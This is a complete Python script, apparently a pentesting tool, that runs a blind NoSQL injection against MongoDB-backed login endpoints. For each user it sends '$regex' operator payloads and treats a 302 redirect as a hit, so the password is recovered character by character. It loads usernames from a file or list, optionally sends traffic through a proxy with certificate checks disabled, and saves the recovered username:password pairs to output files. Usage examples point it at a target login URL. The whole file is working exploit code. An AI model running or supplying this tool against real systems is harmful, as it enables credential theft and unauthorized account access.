#!/usr/bin/python3

from pwn import *
import requests, signal, sys, string, argparse, urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def def_handler(sig, frame):
    print("\n\n[!] Exiting ...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

def enumeratePassword(url, session, username, progress_bar):
    password = ""
    characters = "".join(sorted(set(char for char in string.printable if char.isprintable()), key=string.printable.index))
    
    while True:
        character_found = False
        
        for character in characters:
            if character in '.^$*+?{}[]\\|()':
                regex_character = '\\' + character
            else:
                regex_character = character
            
            data = {
                'username': username,
                'password': {
                    '$regex': f'^{password}{regex_character}'
                }
            }
            
            progress_bar.status(f"{{'username': '{username}', 'password': {{'$regex': '^{password}{regex_character}'}}}}")
            
            try:
                request = session.post(url, json=data, allow_redirects=False, timeout=300)
            except requests.exceptions.RequestException as e:
                log.error(f"Request error: {e}")
                continue
            
            if request.status_code == 302:
                password += character
                character_found = True
                break
        
        if not character_found:
            break
    
    return password

def loadUsersFromFile(filename):
    try:
        with open(filename, 'r') as f:
            users = [line.strip() for line in f if line.strip()]
        return users
    except FileNotFoundError:
        log.error(f"File not found: {filename}")
        sys.exit(1)
    except Exception as e:
        log.error(f"Error reading file: {e}")
        sys.exit(1)

def extractPasswords(url, proxy_url=None, user_file=None, usernames_list=None, output_file="credentials.txt", passwords_file="passwords.txt"):
    session = requests.Session()

    session.headers.update({
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    })
    
    if proxy_url:
        proxies = {
            'http': proxy_url,
            'https': proxy_url
        }
        session.proxies = proxies
        session.verify = False
    
    if user_file:
        log.info(f"Loading users from file: {user_file}")
        usernames = loadUsersFromFile(user_file)
    elif usernames_list:
        log.info("Using provided users list")
        usernames = usernames_list
    else:
        log.error("No usernames provided. Use -uf or -ul parameter")
        sys.exit(1)
    
    if not usernames:
        log.failure("No users to process")
        return
    
    log.info(f"Total users to process: {len(usernames)}")
    
    progress_bar = log.progress("Enumerating passwords")
    
    credentials = []
    passwords_only = []
    files_created = False
    
    for username in usernames:
        password = enumeratePassword(url, session, username, progress_bar)
        
        if password:
            log.success(f"✓ Credentials found -> {username}:{password}")
            credential = f"{username}:{password}"
            credentials.append(credential)
            passwords_only.append(password)
            
            mode = 'a' if files_created else 'w'
            
            with open(output_file, mode) as f_creds:
                f_creds.write(f"{credential}\n")
            
            with open(passwords_file, mode) as f_pass:
                f_pass.write(f"{password}\n")
            
            files_created = True
        else:
            log.warning(f"No password found for {username}")
    
    if credentials:
        log.info(f"Total passwords found: {len(credentials)}")
        log.info(f"Credentials saved to {output_file}")
        log.info(f"Passwords saved to {passwords_file}")
    else:
        log.failure("No passwords found")

if __name__ == '__main__':
    
    class CustomFormatter(argparse.RawDescriptionHelpFormatter):
        def __init__(self, prog):
            super().__init__(prog, max_help_position=35, width=150)
    
    parser = argparse.ArgumentParser(
        description='Tool to extract passwords using NoSQL Injection in MongoDB',
        formatter_class=CustomFormatter,
        epilog='''
Usage examples:
  
  Extract passwords loading users from a file:
    %(prog)s -u https://target.com/login -uf users.txt
    %(prog)s -u https://target.com/login -uf users.txt -oc credentials.txt
    %(prog)s -u https://target.com/login -uf users.txt -p http://127.0.0.1:8080

  Extract passwords using a list of users:
    %(prog)s -u https://target.com/login -ul admin,root,test
    %(prog)s -u https://target.com/login -ul admin,user -oc admin_creds.txt
    %(prog)s -u https://target.com/login -ul admin -p http://127.0.0.1:8080

  Set a proxy:
    %(prog)s -u https://target.com/login -uf users.txt -p http://127.0.0.1:8080 -oc results.txt
        ''' )
    
    parser.add_argument('-u', '--url', 
                        required=True,
                        metavar='',
                        help='Target URL of the login endpoint (e.g.: https://example.com/login)')
    parser.add_argument('-p', '--proxy',
                        metavar='',
                        help='Proxy URL to intercept traffic (e.g.: http://127.0.0.1:8080)')
    
    users_input = parser.add_mutually_exclusive_group(required=True)
    users_input.add_argument('-uf', '--user-file',
                            metavar='',
                            help='Text file containing users (one per line)')
    users_input.add_argument('-ul', '--user-list',
                            metavar='',
                            help='Comma-separated list of users (e.g.: admin,root,test)')
    
    parser.add_argument('-oc', '--output-credentials',
                          metavar='',
                          default='credentials.txt',
                          help='File to save credentials in user:pass format (default: credentials.txt)')
    parser.add_argument('-op', '--output-passwords',
                          metavar='',
                          default='passwords.txt',
                          help='File to save only passwords (default: passwords.txt)')
    
    args = parser.parse_args()
    
    usernames_list = None
    if args.user_list:
        usernames_list = [u.strip() for u in args.user_list.split(',') if u.strip()]
        if not usernames_list:
            log.error("The user list is empty")
            sys.exit(1)
    
    extractPasswords(
        url=args.url, 
        proxy_url=args.proxy,
        user_file=args.user_file,
        usernames_list=usernames_list,
        output_file=args.output_credentials,
        passwords_file=args.output_passwords
    )
